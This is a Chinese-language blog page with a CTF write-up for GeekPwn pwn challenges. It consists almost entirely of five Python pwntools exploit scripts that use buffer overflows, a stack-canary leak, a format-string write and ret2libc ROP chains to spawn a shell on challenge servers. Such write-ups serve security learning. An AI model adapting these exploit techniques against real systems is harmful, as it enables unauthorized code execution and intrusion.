@@ -1,0 +1,162 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Geekpwn_pwn_writeup | eternal</title><meta name="keywords" content="pwn"><meta name="author" content="eternal,1397239425@qq.com"><meta name="copyright" content="eternal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="jichuexp:  from pwn import*context.log_level&#x3D;&#39;debug&#39;p&#x3D;remote(&#39;172.18.0.1&#39;,10000)#p&#x3D;process(&#39;.&#x2F;jichu&#39;)elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)sh&#x3D;0x080482eas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Geekpwn_pwn_writeup">
+<meta property="og:url" content="http://example.com/2020/11/27/Geekpwn-pwn-writeup/index.html">
+<meta property="og:site_name" content="eternal">
+<meta property="og:description" content="jichuexp:  from pwn import*context.log_level&#x3D;&#39;debug&#39;p&#x3D;remote(&#39;172.18.0.1&#39;,10000)#p&#x3D;process(&#39;.&#x2F;jichu&#39;)elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)sh&#x3D;0x080482eas">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2020-11-27T05:06:17.000Z">
+<meta property="article:modified_time" content="2020-11-27T05:16:59.821Z">
+<meta property="article:author" content="eternal">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/ad.jpg"><link rel="canonical" href="http://example.com/2020/11/27/Geekpwn-pwn-writeup/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: {"text":"A,B,C,D,E,F,G","fontSize":"15px"},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2020-11-27 13:16:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="eternal" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/ccc.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> photos</span></a></li><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> shuoshuo</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">eternal</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> photos</span></a></li><li><a class="site-page" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> shuoshuo</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Geekpwn_pwn_writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-27T05:06:17.000Z" title="发表于 2020-11-27 13:06:17">2020-11-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-11-27T05:16:59.821Z" title="更新于 2020-11-27 13:16:59">2020-11-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/GeekPwn/">GeekPwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="jichu"><a href="#jichu" class="headerlink" title="jichu"></a>jichu</h2><p><strong>exp:</strong> </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;172.18.0.1&#39;,10000)</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;jichu&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh&#x3D;0x080482ea</span><br><span class="line">system&#x3D;elf.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x48+&#39;aaaa&#39;+p32(system)+p32(0xdeadbeef)+p32(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;Please input admin password:&#39;,&#39;administrator&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Please input new log info:&#39;,payload)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.sendline(&#39;cat flag&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn00"><a href="#pwn00" class="headerlink" title="pwn00"></a>pwn00</h2><p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,1000)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn00&quot;)</span><br><span class="line"></span><br><span class="line">pop_ret&#x3D;0x0000000000400813</span><br><span class="line">def main():</span><br><span class="line">	p.recvuntil(&quot;Do you want to play with me?\n&quot;)</span><br><span class="line">	payload&#x3D;&#39;a&#39;*0x70+&#39;aaaaaaaa&#39;+p64(pop_ret)+p64(0x4008B5)+p64(0x4007A2)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,3333)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;baby_canary&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;0x400873</span><br><span class="line"># bin_sh&#x3D;0x00000000004008ee</span><br><span class="line">bin_sh&#x3D;0x00000000004008ED</span><br><span class="line">system&#x3D;0x4007FC</span><br><span class="line">def main():</span><br><span class="line">	p.recvuntil(&#39;plz tell me.\n&#39;)</span><br><span class="line">	payload&#x3D;&#39;a&#39;*0x68</span><br><span class="line">	# gdb.attach(p)</span><br><span class="line">	</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	p.recvuntil(&#39;a&#39;*0x68)</span><br><span class="line">	canary&#x3D;u64(p.recv(8).ljust(8,&quot;\x00&quot;))-0xa</span><br><span class="line">	print hex(canary)</span><br><span class="line">	payload&#x3D;&#39;a&#39;*0x68+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	# p.recv()</span><br><span class="line"></span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp：</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 2222)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;fmt&quot;)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;fmt&#39;)</span><br><span class="line">system&#x3D;0x4012DB</span><br><span class="line"></span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	p.recvuntil(&#39;hello world!&#39;)</span><br><span class="line">	bss&#x3D;0x40409C</span><br><span class="line">	payload&#x3D;&#39;%&#39;+str(0x1000)+&#39;c%12$hn&#39;+&#39;%&#39;+str(0x1000)+&#39;c%13$hn&#39;+&#39;\x00&#39;*8+p64(bss)+p64(bss+2)  &#x2F;&#x2F;格式化字符串写入操作</span><br><span class="line">		修改seed地址后两字节        修改seed地址前两字节                       两字节两字节修改的bss段安排</span><br><span class="line">	# gdb.attach(p,&#39;b *0x401261\nc\n&#39;)</span><br><span class="line"></span><br><span class="line">	# gdb.attach(p)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	sleep(1)</span><br><span class="line">	a&#x3D;[&#39;2121385791&#39;,&#39;1417272958&#39;,&#39;1222019344&#39;,&#39;189308997&#39;,&#39;2113086160&#39;,&#39;43315344&#39;,&#39;1978613629&#39;,&#39;710758478&#39;,&#39;1825758792&#39;,&#39;118621091&#39;,&#39;1330609383&#39;,&#39;97980547&#39;,&#39;203100239&#39;,&#39;120334289&#39;,&#39;1085921916&#39;,&#39;75582125&#39;]</span><br><span class="line">	print(len(a))</span><br><span class="line">	for i in range(0,len(a)):</span><br><span class="line">		p.sendline(a[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	p.recvuntil(&quot;running sh&quot;)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"># context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 1122)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	libc&#x3D;ELF(&#39;.&#x2F;libc&#39;)</span><br><span class="line">	elf&#x3D;ELF(&#39;.&#x2F;pwn111&#39;)</span><br><span class="line">	pop_rbp_ret&#x3D;0x000000000040112d</span><br><span class="line">	pop_rdi_ret&#x3D;0x0000000000401233</span><br><span class="line">	write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">	libc_start_main_got&#x3D;elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">	#libc中的基地址</span><br><span class="line">	bin_sh_libc&#x3D;next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))                     #0x0000000000180544</span><br><span class="line">	system_libc&#x3D;libc.symbols[&#39;system&#39;]</span><br><span class="line">	print hex(bin_sh_libc)</span><br><span class="line">	print hex(system_libc)</span><br><span class="line"></span><br><span class="line">	#函数的偏移offset</span><br><span class="line">	libc_start_main_offset&#x3D;libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">	p.recvuntil(&quot;please input: &quot;)</span><br><span class="line"></span><br><span class="line">	# gdb.attach(p)</span><br><span class="line">	main&#x3D;0x0000000000401146</span><br><span class="line">	rsi_r15_ret&#x3D;0x0000000000401231</span><br><span class="line">	r14_r15_ret&#x3D;0x0000000000401230</span><br><span class="line">	payload1&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(libc_start_main_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">	p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	#打印出write()函数在got表中的地址</span><br><span class="line">	libc_start_main_add&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">	print &quot;libc_start_main_add&#x3D;&quot;+hex(libc_start_main_add)</span><br><span class="line">	offset&#x3D;libc_start_main_add-libc_start_main_offset</span><br><span class="line">	system_add&#x3D;offset+system_libc</span><br><span class="line">	bin_sh_add&#x3D;offset+bin_sh_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	p.recv()</span><br><span class="line">	payload2&#x3D;&#39;a&#39;*0x80+&#39;a&#39;*8+p64(pop_rdi_ret)+p64(bin_sh_add)+p64(system_add)</span><br><span class="line">	p.sendline(payload2)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1397239425@qq.com">eternal</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2020/11/27/Geekpwn-pwn-writeup/">http://example.com/2020/11/27/Geekpwn-pwn-writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">eternal</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2020/11/26/GeekPwn-pwn222/"><img class="next-cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Geekpwn Pwn222</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/ccc.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">eternal</div><div class="author-info__description">池鱼思故渊</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mRdzut"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mRdzut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1397239425@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎！</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2020/11/27/Geekpwn-pwn-writeup/" title="Geekpwn_pwn_writeup"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Geekpwn_pwn_writeup"/></a><div class="content"><a class="title" href="/2020/11/27/Geekpwn-pwn-writeup/" title="Geekpwn_pwn_writeup">Geekpwn_pwn_writeup</a><time datetime="2020-11-27T05:06:17.000Z" title="发表于 2020-11-27 13:06:17">2020-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/26/GeekPwn-pwn222/" title="Geekpwn Pwn222"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Geekpwn Pwn222"/></a><div class="content"><a class="title" href="/2020/11/26/GeekPwn-pwn222/" title="Geekpwn Pwn222">Geekpwn Pwn222</a><time datetime="2020-11-26T10:17:48.000Z" title="发表于 2020-11-26 18:17:48">2020-11-26</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 By eternal</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script></div></body></html>
